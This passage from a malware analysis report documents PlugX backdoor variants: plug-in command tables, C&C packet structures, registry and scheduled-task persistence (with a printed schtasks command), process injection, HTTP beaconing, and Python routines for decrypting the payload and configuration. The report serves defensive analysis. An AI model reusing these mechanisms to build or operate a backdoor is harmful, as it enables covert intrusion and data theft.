0x300A|-|-|\n|0x300C|Creates a process using the command line transmitted in the command body. With that, if the errc field|struct command_300С h_request { packet_hdr header;|struct command_300С h_response { packet_hdr header;|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||value is non-zero in the packet header, it creates the HH desktop and uses it in the STARTUP_INFO of the created process. As a response it returns PROCESS_INFORMAT ION of the created process|BYTE cmdline[] };|PROCESS_INFORMATION proc_info; };|\n|0x300D|Executes the SHFileOperationW function with the parameters specified in the command. Responds with a zero- length packet|struct c2_command_3 00Dh_disk_srv2cli { packet_hdr header; DWORD FO_wFunc; WORD FOF_flags; WORD word_0; WORD source_file_na me_offset; WORD dest_file_name _offset; ... //strings ;|-|\n|0x300E|Expands the environment variable and sends the result to the server. The variable is contained in the command body, and the result is contained in the response body|-|-|\n\n\n**DISK (2) Plug-in**\n\nThe second plug-in is also called DISK, but it does not relate to logical drives. There are the\nfollowing commands: 0xF010, 0xF011, 0xF012, 0xF013.\n\nIn the command the trojan receives the srv structure, according to which it creates a\nconnection object and starts relaying packets from one connection to the newly created one.\n\n\n-----\n\n**KeyLogger Plug-in**\n\nThere is a 0xE000 command. The trojan reads the plug-in event log file, then sends it to the\nC&C server in the response body.\n\n**Nethood Plug-in**\n\nThe plug-in is used to operate in the network environment.\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|0xA000|Lists all available network resources. For each resource it fills the structure and then sends it to the C&C server. The command contains parameters of the NETRESOURCE structure used as an argument when calling the WNetOpenEnumW function|struct command_A000 h_request { packet_hdr header; WORD netres_scope; WORD netres_type; WORD netres_display _type; WORD netres_usage; WORD off_netres_loc alname; WORD off_netres_rem otename; WORD off_etres_comm ent; WORD off_netres_pro vider; };|struct command_A000 h_response { packet_hdr header; WORD netres_scope; WORD netres_type; WORD netres_display _type; WORD netres_usage; WORD off_netres_loc alname; WORD off_netres_rem otename; WORD off_etres_comm ent; WORD off_netres_pro vider; BYTE res_comment_st r[1000]; NETRESOURCEW net_res_struct; };|\n|0xA001|Disables the network resource specified in the command with the Force flag, then reconnects it. Responds with a zero- length packet|struct command_A001 h_request { packet_hdr header; DWORD netres_scope; DWORD netres_type;|-|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|||DWORD netres_displa y_type; DWORD netres_usage; WORD netres_localna me_offset; WORD netres_remoten ame_offset; WORD netres_comment _offset; WORD netres_provide r_offset; WORD add_conn_usern ame; WORD add_conn_passw ord_offset; DWORD add_conn_flag s; ... //strings };||\n\n\n**Netstat Plug-in**\n\nThe plug-in collects and sends information about network connections.\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|0xD000|Collects and sends information about TCP connections. Depending on the OS version, it calls one of the functions to get connection information: AllocateAndGetTc pExTableFromStac k (Windows XP); GetTcpTable (Windows 2000); GetExtendedTcpTa|-|struct command_D000 h_response { packet_hdr header; DWORD conn_state; DWORD local_addr; DWORD local_port; DWORD remote_addr; DWORD remote_port; DWORD owner_pid; BYTE proc_name[]; };|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||ble (Windows Vista- Windows 7)|||\n|0xD001|Collects information about UDP connections. It is similar to the previous command|-|struct udp_listener _table { DWORD local_addr; DWORD local_port; DWORD owner_port; }; struct command_D001 h_response { packet_hdr header; udp_listener_table udp_tab; BYTE proc_name[]; };|\n|0xD002|Changes the state of the TCP connection. The command body contains an argument for the SetTcpEntry (MIB_TCPROW) function|struct command_D002 h_request { packet_hdr header; MIB_TCPROW tcp_row }|-|\n\n\n**Option Plug-in**\n\nThe plug-in can receive the following commands:\n\n- 0x2000 — to block the system with the LockWorkstation function;\n\n- 0x2001 — to force the user to end the session;\n\n- 0x2002 — to reboot;\n\n- 0x2003 — to shut down the system;\n\n- 0x2005 — to show in a separate MessageBox thread with the specified parameters:\n\n\n-----\n\n**Portmap Plug-in**\n\nThe plug-in contains the 0xB000 command. From the C&C server it receives its address and\nport:\n```\n struct command_0xB000_request\n {\n  packet_hdr header;\n  WORD port;\n  BYTE srv_addr[40];\n }\n\n```\nIt then creates a TCP connection object and connects to the received address of the C&C\nserver. Following that, it works in tunnel connection mode, transmitting data from the C&C\nserver to the server it has established a connection with.\n\n**Process Plug-in**\n\n|Command_id|Description|Output|\n|---|---|---|\n|0x5000|Receives a list of running processes. Each process corresponds to a separate packet being sent|struct command_5000h_respo nse { packet_hdr header; BOOL if_sfc_protected; BOOL is_wow64; DWORD pid; WORD off_username; WORD off_user_domain; WORD off_proc_path; WORD off_CompanyName; WORD off_FileDescription; WORD off_FileVersion; WORD off_ProductName; WORD off_ProductVersion; WORD off_icon_bitmask_bitm ap; WORD off_icon_color_bm; ... //strings };|\n|0x5001|Gets a list of modules for the specified process; the target process ID is set in the header.errc field of the command|struct command_5001h_respo nse { packet_hdr header; BOOL if_sfc_protected; DWORD dll_base; DWORD size_of_image; FILETIME creation_time;|\n\n\n-----\n\n|Command_id|Description|Output|\n|---|---|---|\n|||FILETIME last_access_time; FILETIME last_write_time; WORD off_module_path; WORD off_CompanyInfo; WORD off_FileDescription; WORD off_FileVersion; WORD off_ProductName; WORD off_ProductVersion; ... //strings };|\n|0x5002|Terminates the process; the ID is set in the header.errc field of the command|-|\n\n\n**Regedit Plug-in**\n\nThe plug-in is designed to operate with system registry.\n\n\n-----\n\n-----\n\n-----\n\n**Screen plug-in**\n\nCreates and sends desktop screenshots and imitates working over the RDP Protocol.\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|0x4000|The command starts 2 separate threads that simulate working over the RDP Protocol. Screenshots of the interactive desktop are sent in the first stream. In the second thread, commands related to logging mouse and keyboard events are received and executed. Initially, the 0x4000 command is received along with a packet that indicates the required resolution of screenshots (bits per pixel). The second thread can receive one of these commands: · 0x4004 — focusing on the window according to the coordinates specified in the command and (optionally) by mouse click · 0x4005 — sending keyboard event logs · 0x4006 — sending HWND_BROADCAST message with the CTRL+ALT+DEL key combination|struct command_400 0h_request { packet_hdr header; WORD bits_per_pixe l; } struct command_400 4h_request { packet_hdr header; DWORD mouse_event_ flags; DWORD mouse_event_ data; DWORD x; DWORD y; }; struct command_400 5h_request { packet_0_hdr header; BYTE vkey_code; BYTE key_scan_code ; WORD reserved_0; BYTE keybd_event_f lags; };|struct command_400 0h_screen_attr { packet_hdr header; WORD bits_per_pixe l; WORD horiz_res; WORD ver_res; BYTE bitmap_colos[ ]; }|\n|0x4100|Creates a screenshot with the specified parameters and sends it to the C&C server|struct command_410 0h_request { packet_0_hdr header; BYTE bFlag;|-|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|||BYTE scale_or_reso lution; WORD horz; //if flag -> resolutione, else scale coeff WORD vert; //as horz };||\n|0x4200|Sends a pre-taken screenshot in JPEG format from the config.screenshots _path directory. First it sends its name, then it sends the screenshot itself as blocks by 0xE000 bytes. Then sends a zero-length packet|-|-|\n\n\n**Service Plug-in**\n\nThe plug-in is designed to operate with system services.\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|0x6000|Receives information about services and their files|-|struct command_6000 h_response { packet_hdr header; DWORD if_sfc_protec ted; DWORD current_state ; DWORD start_type; DWORD controls_acce pted; DWORD pid; WORD offset_service _name;|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||||WORD offset_display _name; WORD offset_service _start_name; WORD offset_descrip tion; WORD offset_binpath ; WORD offset_Company Name; WORD offset_FileDes cription; WORD offset_FileVer sion; WORD offset_Product Name; WORD offset_Product Version; ... //strings };|\n|0x6001|Alternates the launch method of the specified service struct command_6000h_res ponse The name of the target service is contained in the command body; the new parameter for the launch method is contained in the header.errc field|-|-|\n|0x6002|Runs the specified service; its name is contained in the command body|-|-|\n|0x6003|Sends the control code to the specified service.|-|-|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||The name is contained in the body; the control code is contained in the header.errc field|||\n|0x6004|Deletes the service specified in the command body|-|-|\n\n\n**Shell plug-in**\n\nThe plug-in is designed to create a shell for the cmd.exe; plug-in command ID —\n```\ncommand_id — 0x7002. It creates pipes for reading and writing in two separate threads,\n\n```\nthen creates a cmd.exe process and redirects I / O to pipes. The trojan receives input from\nthe connection object to the C&C server and sends an output in response.\n\n**SQL Plug-in**\n\nThe plug-in is designed to operate with SQL queries.\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|0xC000|Retrieves available SQL data sources by the odbc32!SQLDataSou rcesW function|-|struct command_C000 h_response { packet_hdr header; BYTE server_name[40 96]; BYTE descriptions[] ; }|\n|0xC001|Lists available SQL drivers by the odbc32!SQLDrivers W function|-|struct command_C001 h_response { packet_0_hdr header; BYTE driver_descrip tion[4096]; BYTE driver_attribu tes[];|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||||};|\n|0xC002|Executes an arbitrary SQL query. The body of the first packet contains the connection string that is used as an argument when calling the odbc32!SQLDriverC onnect function. Next, packets with header.command_id equal to 0xC003 contain the requests. In response, diagnostic data obtained by calling the SQLGetDiagRecW function is sent in packets with header.command_id equal to 0xC008; the results of the SQL query are sent in packets with header.command_id equal to 0xC004|-|-|\n\n\n**Telnet Plug-in**\n\nThe plug-in is designed to fully simulate working over the Telnet Protocol. It starts when the\n```\n0x7100 command is received. Upon this command, the \"cmd.exe /Q” process is created,\n\n```\na zero-length packet is sent to the server, then 2 handlers run in separate threads. The first\none accepts packets with id 0x7101 and 0x7102:\n\n- 0x7101 — opens the console using the CONIN$ ID and enters the data received from the\ncommand. The packet body contains an array of INPUT_RECORD structures;\n\n- 0x7102 — sends the ID of the control event (CtrlEvent) to the console opened by the\n```\n CONIN$ ID. The event code is located in the header.errc field.\n\n```\nThe second handle in packets with id 0x7103 sends information about the console:\n\n\n-----\n\nIn packets with id 0x7104, the trojan sends the read console buffer.\n\n\n#### BackDoor.PlugX.26\n\n\nA loader for BackDoor.PlugX.38 written in C and designed to operate in 32-bit and 64-bit\nMicrosoft Windows operating systems. It is an executable file that loads and decrypts the\npayload module.\n\n##### Operating routine\n\nThe loader is an executable file and its original name is msvsct.exe. Its installation path on\nthe infected system is C:\\ProgramData\\AppData\\msvsct.exe . It writes itself to the\nregistry autostart location:\n```\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] 'AUTORUN' = \"c:\n\\programdata\\appdata\\msvsct.exe.\n\n```\nThe payload is located in msvsct.ini and is decrypted by the following script:\n```\n s = ''\n for i in range(len(d)):\n   s += chr((((ord(d[i]) + 0x77) ^ 0x78) - 0x79) & 0xff)\n\n```\nAfter decryption the payload turns into shellcode, which loads the main malicious module as\na dynamic link library (detected by Dr.Web as BackDoor.PlugX.38).\n\n\n#### BackDoor.PlugX.38\n\n\nA multi-module backdoor written in C and designed to operate in 32-bit and 64-bit\nMicrosoft Windows operating systems. Once installed by the BackDoor.PlugX.26 loader, it\noperates in an infected computer’s RAM. It is used in targeted attacks on information\nsystems for gaining unauthorized access to data and transferring it to C&C servers. The\noperating routine and algorithms are similar to those of BackDoor.PlugX.28. Similar\nstructures are used for storing and processing data, including an identical object for storing\nstrings.\n\n\n-----\n\n**Operating routine**\n\nAll WinAPI functions are called dynamically using the CRC32 algorithm, and the checksum is\ncalculated over the entire function name, including the trailing \\x00.\n\nSimilar to BackDoor.PlugX.28, this modification does not have uniform conventions for user\nfunction calls. Simple string encryption is applied. It is not implemented in a separate\nfunction but embedded in it.\n\n\n-----\n\nThreads are not created directly, but via the global threads_container object, which\nstores a list of running threads with information about each of them. Each thread has its own\nhardcoded name that are encrypted in some cases.\n\nAssumed threads_container structure:\n```\n struct threads_info\n {\n  LIST_ENTRY p_threads_list;\n  DWORD threads_count;\n };\n struct threads_container\n {\n  CRITICAL_SECTION crit_sect;\n  threads_info threads;\n };\n struct thread_obj\n {\n  LIST_ENTRY p_threads;\n  DWORD thread_ID;\n  threads_container *p_threads_container;\n  DWORD (__stdcall *p_function)(LPVOID arg);\n  LPVOID arg;\n  BYTE *name;\n };\n\n```\n**Start of operation**\n\nAfter receiving control from the loader, BackDoor.PlugX.38 initializes a number of global\nobjects that are used in further operations. Then it sets its\n```\nSetUnhandledExceptionFilter exception handler. For an unhandled exception, the\n\n```\nfunction finds the ID of the thread that caused this exception in threads_container and\ngenerates the string:\n\n\n-----\n\nwhere EName is the thread name. The remaining parameters are taken from the\n```\nEXCEPTION_POINTERS structure. The string is generated in a local variable and is not used\n\n```\nin further operations. The handler then terminates this thread.\n\nAfter preparation procedures, the trojan gets the SeDebugPrivilege and\n```\nSeTcbPrivilege privileges, then initializes the main thread with the bootProc name,\n\n```\nwhich is stored in open format.\n\nFirst, bootProc calls FreeLibrary on a module named msvsct.txt. Then the configuration\nis initialized.\n\n**Configuration from the loader**\n\nTo determine the configuration type, the loader passes the argument to the pointer used by\nBackDoor.PlugX.38 to check the first 4 bytes. If the first bytes of the argument are the magic\nnumber, it means the loader passed the shellarg structure. The magic number has the\nvalue 0x504c5547, which corresponds to the PLUG value in the ASCII encoding.\n\nThe shellarg structure is represented as follows:\n```\n struct shellarg\n {\n  DWORD signature;\n  DWORD dword_0;\n  DWORD dword_1;\n  DWORD p_shellcode;\n  DWORD shellcode_size;\n  DWORD config;\n  DWORD config_size;\n };\n\n```\nIn this case, the configuration from the argument is decrypted and stored in the global\nvariable of the trojan program. Then the path to the backdoor's working directory is\nextracted from the received configuration. The trojan attempts to read boot.cfg from this\n\n\n-----\n\ndirectory, which can also store the configuration (for example, passed from the C&C server).\nIf the file exists, the program reads the configuration from it, decrypts it, and applies it.\n\nConfiguration encryption algorithm:\n```\n import struct\n def DWORD(i):\n   return i & 0xFFFFFFFF\n def LOBYTE(i):\n   return i & 0x000000FF\n def dec(key, in_data):\n   k1 = k2 = k3 = k4 = key\n   result = \"\"\n   for x in in_data:\n     k1 = DWORD(k1 + (k1 >> 3) - 0x11111111)\n     k2 = DWORD(k2 + (k2 >> 5) - 0x22222222)\n     k3 = DWORD(k3 + 0x33333333 - (k3 << 7))\n     k4 = DWORD(k4 + (0x44444444 - (k4 << 9)))\n     k = LOBYTE(k1 + k2 + k3 + k4)\n     result += chr(ord(x) ^ k)\n   return result\n def decrypt(addr, size):\n   data = get_bytes(addr, size, 0)\n   key = struct.unpack(\"<I\", data[:4])[0]\n   result = dec(key, data)\n   return result\n\n```\n**Hardcoded configuration**\n\nThe hardcoded configuration is decrypted if the argument received from the loader does\nnot have the PLUG magic value.\n\nStructure of the configuration:\n\n\n-----\n\nAfter initializing the configuration, the trojan checks the command line arguments. If there is\none argument, the program uses a standard script for achieving persistence and performing\nbasic functions; if the command line contains three arguments, the program performs one of\nthe functions, depending on their values.\n\n**Operating with a single command line argument**\n\nThe persistence option depends on the config.persist_mode value:\n\n- 0 — does not achieve persistence, goes directly to the main functionality;\n\n\n-----\n\n- 1 — autorun by HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run;\n\n- 2 — creates tasks in Task Scheduler;\n\n- 3 — sets services (if there are no administrative privileges, it is equivalent to 1 mode).\n\nIf executed without achieving persistence, the trojan checks the config.inject_flag\nflag. If the value is not equal to 0, the argument passed from the loader is checked. If the\nargument contains the PLUG value, the process specified in\n```\nconfig.inject_target_proc is started. The shellcode from the shellarg structure is\n\n```\ninjected into this process and the main process is terminated.\n\nIn case of execution with persistence, the trojan checks the current directory. If it matches the\ntrojan’s working directory config.homedir, the persistence stage is skipped and either the\nprocess injection or the main functionality is performed. Otherwise, 2 mutexes are created\nwith the Global\\DelSelf(XXXXXXXX) and Global\\DelSelf(YYYYYYYYY) names,\nwhere XXXXXXXX and YYYYYYY are IDs of the current and parent processes in the HEX view,\nrespectively. In all persistence modes, the trojan moves its files to the working directory.\n\nThe persistence provides an option when the config.persist_mode parameter can take\nthe 0 value. This is necessary if the process is started with 3 arguments and the second\nargument equals 100. In such conditions, after transferring its files, BackDoor.PlugX.38 is\nrestarted from its working directory.\n\nIn the persistence option with the value config.persist_mode == 1, the autorun key\ncreates a parameter with the name specified in the config.persist_name configuration.\nAfter that, the trojan launches itself from the working directory.\n\nIf the persistence option is set to config.persist_mode == 2, a task is created in the\nscheduler by calling schtasks:\n```\n cmd.exe /c schtasks /create /sc minute /mo 2 /tn \"<config.persist_name>\" /tr\n \"\\\"<config.homedir\\msvsct.exe>\\\"\"\n\n```\nIf administrative privileges are obtained, the trojan adds the /ru \"system” parameter.\nAfter creating the task, the trojan terminates the process.\n\nIf the persistence option is set to config.persist_mode == 3, a service is set. The trojan\nchecks for a service named config.persist_name and, if it exists and stopped, deletes it.\nIf the service is running, the service creation step is skipped. Otherwise, the trojan creates the\n```\nconfig.persist_name service with the config.service_display_name display\n\n```\nname. If the config.flag_dont_start_service value is not equal to 0, the service\ndoes not start. After creating the service, the trojan terminates the process.\n\nWhen performing the main functionality, the trojan creates the Global\\ReStart0 mutex.\nThen by a mutex named Global\\DelSelf(YYYYYYYYY), the program searches for the\nparent process. After the search the process is terminated, the process’ binary is deleted\n(provided the config.flag_delete_proc_bins flag is set). Next, the trojan checks the\n\n\n-----\n\nvalue of the config.flag_elevated_inject flag. If the value is not equal to 0, the\nnamed thread SiProc is started.\n\nIn this thread, the malware also checks the argument passed by the loader. Further execution\nof the SiProc thread continues only if the PLUG value is present. The thread iterates\nthrough the processes and attempts to get the session ID based on the PID value of each\nprocess. If successful, it copies the process access token and assigns the (S-1-16-12288)\nHighIntegrity class to its duplicate. Then, using this marker, it creates the msiexec.exe\n```\n209 <currentPID> process, which injects shellcode with a payload. The thread receives a\n\n```\npointer to the elevated_injects structure as an argument:\n```\nstruct injected_proc\n{\n DWORD session_id;\n DWORD pid;\n DWORD hProcess;\n BYTE token_user_name[40];\n};\nstruct elevated_injects\n{\n injected_proc procs[32];\n DWORD hThread;\n DWORD hEvent;\n};\n\n```\nEach time the shellcode is successfully injected, the elevated_injects.procs array is\nfilled in.\n\nAfter this, the plug-in container object and the plug-ins themselves are initialized. Then an\narray of auxiliary functions used by the plug-ins is initialized. These functions are accessed\nvia the named display of the PI[%8.8 X] object, where the format parameter is the ID of\nthe current process.\n\n\n-----\n\nThen each plug-in is sequentially initialized, resulting in an individual object\n```\nplugin_object creation:\n struct plugin_object\n {\n  DWORD dword_1;\n  DWORD init_flag;\n  DWORD index;\n  DWORD datestamp;\n  DWORD (__stdcall *p_job_func)(LPVOID p_conn_object, packet *p_packet);\n  BYTE name[32];\n };\n\n```\nThe plug-in names correspond to those of BackDoor.PlugX.28, with the exception of the\nabsence of the DISK second plug-in. The values placed in plugin_object. datestamp\ndiffer for each plug-in:\n\n\n-----\n\n|Plug-in name|Datestamp value|\n|---|---|\n|Disk|20120325h|\n|KeyLog|20120324h|\n|Nethood|20120213h|\n|Netstat|20120215h|\n|Option|20120128h|\n|PortMap|20120325h|\n|Process|20120204h|\n|RegEdit|20120315h|\n|Screen|20120220h|\n|Service|20120117h|\n|Shell|20120305h|\n|SQL|20120323h|\n|Telnet|20120225h|\n\n\nSimilar to BackDoor.PlugX.28, the initialization of the KeyLog and Screen plug-ins differ\nfrom the others. When initializing KeyLog, a named stream KLProc is created, in which the\ntrojan intercepts keyboard events via the RegisterRawInputDevices and\n```\nGetRawInputData functions. The event log is contained in the\n<config.homedir>\\NvSmart.hlp file. When initializing the Screen plug-in, 16 cursors\n\n```\nare sequentially loaded in addition to creating an object.\n\n\n-----\n\nAfter initializing all plug-ins, the named thread PlugProc is started. The stream attempts to\nsequentially read files with the .plg extension from the working directory, whose names can\ntake values from 0 to 127. A compressed and encrypted PE module can be read from each\nof the files. If the argument from the loader contains the PLUG value, after reading the file,\nthe next named thread LdrLoadShellcode is initialized. It decrypts and unpacks the\nmodule, and then loads it, passing it the shellarg structure with the PLUG value as an\nargument. It should be noted that the ldrloadshellcode procedure is used when\ninjecting in processes from the configuration and in the msiexec process by copying to the\ntarget process.\n\nAfter working with plug-ins, the OlProc thread is started, which communicates with the\nC&C server. In addition, several other threads are started from OlProc. The trojan\npreliminarily attempts to extract the CLSID parameter from the\n```\nSoftware\\CLASSES\\MPLS\\ registry key. The extraction is performed from the HKLM\n\n```\nsection, or in case of failure, from the HKCU section. If the specified parameter is absent, the\ntrojan creates it, generates a random value of 8 bytes, formats it as %2.2X%2.2X%2.2X%\n```\n2.2X%2.2X%2.2X%2.2X%2.2X, and enters this value into the created parameter. Similar to\n\n```\nBackDoor.PlugX.28, inside OlProc the malware attempts to hide the service in the\nservices.exe process (provided the config.flag_hide_service flag is set). Then the\n```\nOlProcNotify thread is started, and the configuration is initialized again.\n\n```\nAfter that, a cycle of connections to the server starts. It is possible to load the address of a\nnew C&C server if there have already been attempts to connect to 4 servers. There are URLS\nof the form config.url_<n> provided for this purpose. An HTTP request is made at the\n\n\n-----\n\nspecified URL, and the response is an encoded server address located between the DZKS\nand DZJS strings. Servers can be resolved using queries to DNS servers specified in the\nconfiguration file.\n\nThe first connection attempt is performed without a proxy. Before doing this, the trojan\nchecks the value of the config.timetable parameter, which is responsible for the\nconnection schedule (the byte flag is set for every quarter of an hour). Then it checks the\ntype of server to connect to. The srv structure is similar to that of BackDoor.PlugX.28:\n```\n struct srv\n {\n  WORD type;\n  WORD port;\n  BYTE address[64];\n };\n\n```\nIn this case, the BackDoor.PlugX.38 type field, which defines the connection Protocol, is a\nbit field:\n\n- 1 — TCP,\n\n- 2 — HTTP,\n\n- 4 — UDP,\n\n- 8 — ICMP,\n\n- 16 — HTTPS.\n\nIn the analyzed sample, the ICMP Protocol is not supported, but the value is provided (a stub\nis set when creating the connection object). When using the HTTPS Protocol, the trojan\nutilizes a connection to an HTTP proxy server via a socket.\n\nWhen creating a connection object, a connection string is generated that is not used in the\nanalyzed sample:\n```\n Protocol:[%4s], Host: [%s:%d], Proxy: [%d:%s:%d:%s:%s]\n\n```\nA packet structure similar to BackDoor.PlugX.28 is used to communicate with the server:\n\n\n-----\n\nFor initial access, similar to BackDoor.PlugX.28, the trojan generates from 0 to 0x1F random\nbytes, which are sent to the server. A packet with the command is a response for the request.\n\nWhen using an HTTP connection, there are differences from BackDoor.PlugX.28 in the\nrequest generation mechanism.\n\nA SxWorkProc named thread is created. First, the User-Agent string is formed in parts:\n\n1. Hardcoded Mozilla/4.0 (compatible; MSIE string;\n\n2. The value of the HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Version\n```\n Vector\\IE parameter or hardcoded 8.0;\n\n```\n3. Windows NT X.Y, where X.Y is the Windows version;\n\n4. Parameter values from the\n```\n HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\n Settings\\5.0\\User Agent\\Post Platform,\n HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\n Settings\\User Agent\\Post Platform keys, as well as similar values from the\n\n```\nHKCU section, are combined via ;;\n\n5. Closing bracket ).\n\nThe specified parts are combined into a single string that serves as the User-Agent.\n\nThe resource string is formed as /index?id=%7.P, where the parameter is the address of\nthe local variable. The method is selected depending on the value of\n```\nconfig.HTTP_method:\n\n```\n- 0 — GET;\n\n- 1 — POST;\n\n- 2 — random choice between GET and POST.\n\nThen M-headers are added, which are necessary for the HTTP connection to work and sync\n(similar to the prefix structure in BackDoor.PlugX.28).\n\n- M-Session:\n\n- M-Status:\n\n- M-Size:\n\n- M-Sn:\n\n\n-----\n\nData is transmitted in the request body. Packets are encrypted using the same algorithm\nused for the encryption configuration. When preparing a packet for encryption, the\n```\npacket.header.key field contains the 20161127h value, but later it is replaced with a\n\n```\nrandom key. When encrypting and compressing both transmitted and received data, the\nfollowing options can be used:\n\n- If in the packet_hdr.command_id field the bit is set to 0x10000000, a packet is not\ncompressed (for example, the closing packet after sending a file);\n\n- If the bit is set to 0x20000000 in the same field, the packet is not encrypted.\n\nThe field of the len header specifies the length of the compressed and uncompressed data\n(2 low-order bytes for compressed length, 2 high-order bytes for uncompressed length).\n\nWhen using a TCP connection, data is transmitted without any headers.\n\nThe general commands are similar to those of BackDoor.PlugX.28:\n\n**Command** **Function**\n\n1 Sending system information\n\n2 Re-requesting the command\n\n3 Operating with plug-ins\n\n4 Connection reset\n\n5 Self-deleting\n\n6 Sending current configuration to the C&C server\n\n7 Receiving new configuration.\n\n8 Sending information about processes with injections (msiexec.exe)\n\n9 Sending the results of LAN scanning\n\n10 (see below)\n\nOperating with plug-ins (command 3) is performed in a separate OlProcManager thread\nand implemented the same way as in BackDoor.PlugX.28.\n\nWhen a new configuration is received, it is saved as <config.homedir>\\boot.cfg and\napplied immediately. After that, the trojan receives information about proxy servers from all\navailable sources:\n\n|Command|Function|\n|---|---|\n|1|Sending system information|\n|2|Re-requesting the command|\n|3|Operating with plug-ins|\n|4|Connection reset|\n|5|Self-deleting|\n|6|Sending current configuration to the C&C server|\n|7|Receiving new configuration.|\n|8|Sending information about processes with injections (msiexec.exe)|\n|9|Sending the results of LAN scanning|\n|10|(see below)|\n\n\n-----\n\n- All proxy server parameters separated by : — <type: port:address: ID:\n```\n password> are extracted from the HKLM\\Software\\CLASSES\\MPLS\\PROXY registry\n\n```\nkey;\n\n- Proxy system data is extracted from the\n```\n HKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\n\n```\nregistry key;\n\n- The AutoConfigURL parameter retrieves the address used to call the\n```\n UrlDownloadToFileA function. Then using InternetGetProxyInfo WinAPI from\n\n```\njsproxy.dll the trojan makes a request to appengine[.]google.com, which results in\nobtaining proxy server data;\n\n- Proxy data is extracted from the Mozilla configuration file: .default\\prefs.js.\n\nAll received data is saved in the internal object and used for connection. SOCKS4, SOCKS5,\nand HTTP proxy protocols can be used to establish a connection.\n\nAfter OlProcNotify, a new thread JoProc is initialized in the same OlProc, which then\ninitializes 3 threads sequentially:\n```\n JoProcListen\n JoProcBroadcast\n JoProcBroadcastRecv\nJoProcListen starts the JoProcAccept thread, which creates a UDP connection object\n\n```\nand also connects to the C&C server. It is assumed that this thread should have asynchronous\nforwarding between the UDP connection and the connection to the С&C server but the\ncreated UDP connection object is non-working. When created, it does not connect to any\nhost, and the conditional methods that should transmit and receive data represent stubs that\nreturn the 0 value.\n\nThe same applies to the JoProcBroadсast and JoProcBroadcastRecv functions.\n```\nJoProcBroadсast iterates through the available network adapters, retrieves their IP\n\n```\naddresses, subnet masks, and gateway addresses, then creates a real TCP connection object\nand exits. JoProcBroadcastRecv also has no functionality.\n\nIt should be noted that the above operations are performed only if the\n```\nconfig.broadcasting flag is set. The 9, 10 commands of the C&C server are also\n\n```\ndesigned to work with network scanning, but there is no useful functionality in them. When\nthe 10 command is received, the config.broadcasting flag is checked and then the\ncommand execution stops.\n\n\n-----\n\n**Executing with 3 command line arguments**\n\n|Second command line argument|Value|Conditions for getting an argument|\n|---|---|---|\n|100|Installation to the system according to config. persist_mode, bypassing the injection in processes|-|\n|200|Injection into the config.inject_target_ proc process|-|\n|201|Main functionality|Passed to the config.inject_target_ proc process at startup and injection|\n|202|Main functionality without achieving persistence|-|\n|209|Operating with plug-ins|Transmitted to msiexec.exe in the case of|\n\n\n-----\n\n|Col1|Col2|config.flag_elevated_ inject|\n|---|---|---|\n|300|Self-deleting|-|\n\n\nWhen running with the 209 argument, argv[2] is also counted, which is the ID of the\ntrojan’s parent process that launched msiexec.exe with injection. In this case, the \\\\.\n```\n\\PIPE\\RUN_AS_USER(%d) pipe is created, where the format parameter is the PID of the\n\n```\ncurrent process. Next, the DoImpUserProc thread is initialized, in which the trojan operates\nwith plug-ins. The trojan receives commands for plug-ins from the pipe, and the results are\nsent to the main process in the pipe.\n\n**Operating with plug-ins**\n\nExecution of plug-in tasks is generally identical to BackDoor.PlugX.28, with the exception of:\n\n- The Netstat plug-in, which creates a table of TCP and UDP connections and manages the\nTCP connection, now counts OS versions with MajorVersion == 10;\n\n- The Nethood plug-in only contains the A000h command, which collects information\nabout network resources. This backdoor modification does not include the A001h\ncommand, which allowed the disabling of a given network resource.\n\n**Named threads launching order**\n```\nbootProc is the main function, and the rest of the threads are started from it:\n\n```\n- SiProc (injection to msiexec.exe),\n\n- OlProc,\n\n- OlProcNotify (connecting to the C&C server, working with commands),\n\n- OlProcManager (processing tasks for plug-ins in the framework of the current process),\n\n- JoProc (network scanning),\n\n- JoProcListen (creating a tunnel between a conditional UDP connection and the C&C\nserver),\n\n- JoProcBroadcast (network broadcasting),\n\n- JoProcBroadcastRecv (processing responses to broadcasted messages),\n\n- PlugProc (working with plug-ins during injection),\n\n- LdrLoadShellcode,\n\n- KLProc (keylogger thread),\n\n- SxWorkProc (HTTP connection handler),\n\n- DoImpUserProc (working with plug-ins via pipe).\n\n\n-----\n\nplug-in threads can be launched from OlProcManager and DoImpUserProc, depending\non the configuration:\n\n- RtlMessageBoxProc (Runs while working with the Option plug-in, used to display\n```\n MessageBox with the specified parameters);\n\n```\n- ScreenT1, ScreenT2 (Screen plug-in, threads for RDP emulation);\n\n- ShellT1, ShellT2 (Shell plug-in, threads for reading and writing cmd pipe);\n\n- TelnetT1, TelnetT1 (Telnet plug-in, threads for receiving and sending console\ndata).\n\n\n-----\n\n### Conclusion\n\n\nDuring the investigation, our specialists discovered several families of trojan programs used\nin these attacks. Samples and malicious activity analysis showed that the initial infection\noccurred long before the organization’s employees detected the first signs of malware\npresence. Unfortunately, this scenario is one of the attributes of successful APT attacks, as\nmalware creators always allocate significant resources to concealing their presence within\nthe compromised system.\n\nThe study does not address the primary vector of infection, or the overall picture of infection\nof the entire infrastructure. We are convinced the trojans described in the study are only part\nof the malware involved in these attacks. The mechanisms hackers used make it very difficult\nto detect unauthorized presence and regain control of network objects.\n\nTo minimize risks, it is necessary to constantly monitor internal network resources, especially\nservers that are of high interest to the attackers such as domain controllers, mail servers, and\nInternet gateways. If the system is compromised, a prompt and appropriate analysis of the\nsituation is necessary to develop 